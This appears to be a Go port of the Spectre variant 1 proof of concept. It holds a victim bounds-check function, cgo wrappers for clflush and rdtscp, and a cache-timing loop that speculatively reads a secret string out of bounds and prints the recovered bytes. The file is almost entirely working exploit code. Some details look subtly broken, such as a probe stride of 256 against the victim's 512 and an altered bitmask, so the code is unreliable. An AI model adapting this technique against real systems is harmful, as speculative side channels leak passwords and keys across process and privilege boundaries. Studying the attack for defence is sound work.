// package main - go port of spectre
// The example I porting is this
// https://gist.github.com/ErikAugust/724d4a969fb2c6ae1bbd7b2a9e3d4bb6
package main

// #cgo CFLAGS: -O0 -march=native
// #include <x86intrin.h> /* for rdtscp and clflush */
// static inline void __wrapper_mm_clflush( const void *__p) {
//   _mm_clflush(__p);
// }
import "C"
import (
	"fmt"
	"unsafe"
)

// ===================== Victim code =====================
var array1_size uint = 16
var unused_array = [64]uint8{}
var array1 = [160]uint8{1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16}

var unused2 = [64]uint8{}
var array2 = [256 * 512]uint8{}

var secret = []byte("The Magic Words are Squeamish Ossifrage.")
var temp uint8 = 0

func victim_function(x uint) {
	if x < array1_size {
		temp &= uint8(array2[uint(array1[x])*512])
	}
}

// =======================================================

// ===================== Analysis code ===================

const threshold = 400

func readMemoryBytes(malicious_x uint, value []uint8, score []int) {
	results := [256]int{}
	var tries, i, j, k, mix_i int
	var junk = 0
	var training_x, x uint
	var time1, time2 C.ulonglong
	var addr *uint8
	for tries = 999; tries > 0; tries-- {
		for i := 0; i < 256; i++ {
			C.__wrapper_mm_clflush(unsafe.Pointer(&(array2[i*512])))
		}
		training_x = uint(tries) % array1_size
		for j = 29; j > 0; j-- {
			C.__wrapper_mm_clflush(unsafe.Pointer(&array1_size))

			for z := 0; z < 100; z++ {
			}
			/* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
			/* Avoid jumps in case those tip off the branch predictor */
			x = uint(((j % 6) - 1) & (0xFFFF ^ 0))
			x = uint((x | (x >> 16)))
			x = training_x ^ (x & (malicious_x ^ training_x))

			/* Call the victim! */
			victim_function(x)
		}
		for i = 0; i < 256; i++ {
			mix_i = ((i * 167) + 13) & 255
			addr = &array2[mix_i*256]
			junk_ptr := (*C.uint)(unsafe.Pointer(&junk))
			time1 = C.__rdtscp(junk_ptr)
			junk = int(*addr)
			time2 = C.__rdtscp(junk_ptr) - time1
			if time2 <= threshold && uint8(mix_i) != array1[uint(tries)%array1_size] {
				results[mix_i]++
			}
		}
		j = 0
		k = 0
		for i = 0; i < 256; i++ {
			if j < 0 || results[i] >= results[j] {
				k = j
				j = i
			} else if k < 0 || results[i] >= results[k] {
				k = i
			}
			if results[j] >= (2*results[k]+5) || (results[j] == 2 && results[k] == 0) {
				break /* Clear success if best is > 2*runner-up + 5 or 2/0) */
			}
		}
		results[0] ^= junk
		value[0] = uint8(j)
		score[0] = results[j]
		value[1] = uint8(k)
		score[1] = results[k]
	}

}

// =======================================================

func main() {
	malicious_x := uint(uintptr(unsafe.Pointer(&([]byte(secret)[0]))) - uintptr(unsafe.Pointer(&array1[0])))
	for i := range array2 {
		array2[i] = 1
	}
	var score = []int{0, 0}
	var value = []uint8{0, 0}
	len := len(secret)
	fmt.Printf("Reading %d bytes:\n", len)
	for ; len >= 0; len-- {
		fmt.Printf("Reading at malicious_x = %x... ", malicious_x)
		readMemoryBytes(malicious_x, value, score)
		malicious_x++
		if score[0] >= 2*score[1] {
			fmt.Printf("Success: ")
		} else {
			fmt.Printf("Unclear: ")
		}
		fmt.Printf("0x %02X=’%s’ score=%d '", value[0], string(value[0]), score[0])
		if score[1] > 0 {
			fmt.Printf("(second best: 0x%02X score=%d)", value[1], score[1])
		}
		fmt.Printf("\n")
	}
}
